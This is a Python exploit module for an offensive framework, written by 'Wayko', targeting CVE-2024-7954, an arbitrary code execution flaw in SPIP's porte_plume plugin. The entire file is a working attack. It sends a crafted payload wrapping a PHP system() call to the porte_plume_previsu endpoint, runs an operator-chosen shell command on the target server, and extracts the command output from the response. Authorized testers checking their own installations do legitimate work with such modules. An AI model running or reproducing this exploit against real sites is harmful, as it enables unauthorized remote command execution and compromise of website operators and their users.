#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> AUTOHEADER >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
#   
#   Title : CVE-2024-7954
#   Author: Wayko
#   Information: The porte_plume plugin used by SPIP before 4.30-alpha2, 4.2.13, and 4.1.16 
#                is vulnerable to an arbitrary code execution vulnerability.
#
#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< AUTOHEADER <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

import re
import logging
from hmc.modules import Module, Argument
from urllib.parse import urlparse, urlencode, urljoin

log = logging.getLogger("hmc")

class SPIPPortePlumeRCE(Module):
    module_name = "plume_rce"
    module_desc = "RCE on Porte Plume (CVE-2024-7954)"
    module_auth = "wayko"

    module_args = [
        Argument("url", desc="SPIP target URL (e.g. http://example.org)"),
        Argument("cmd", "-c", "--cmd", desc="Command to execute", default="id")
    ]

    async def execute(self, url: str, cmd: str):

        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        up = urlparse(url)
        protocol = up.scheme.upper()
        host = up.hostname
        port = up.port or (80 if up.scheme == "http" else 443)

        endpoint = "/index.php?action=porte_plume_previsu"
        full_url = urljoin(url, endpoint)

        payload = f'AA_[<img111111>->URL`<?php system("{cmd}"); ?>`]_BB'
        data = f"data={payload}"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }

        try:

            response = await self.env.post(
                url=full_url,
                headers=headers,
                data=data,
            )

            if not response:
                self.log_failure("[-] No response from target")
                return False

            body = response.body
            status = response.status

            match = re.search(r"<a[^>]*>(.*?)</a>", body, re.IGNORECASE | re.DOTALL)
            output = match.group(1).strip() if match else ""

            output = re.sub(r'" class=.*', '', output).strip()

            if output and status == 200:
                self.log_success(f"\n{output}")
                return {'plume_rce':output}

            self.log_failure(f"[-] {protocol:<12} {host:<22} {port:<16} Not vulnerable or no output")
            return {'plume_rce':None}

        except Exception as e:
            self.log_failure(f"[-] Error during exploitation: {e}")
            return {'plume_rce':None}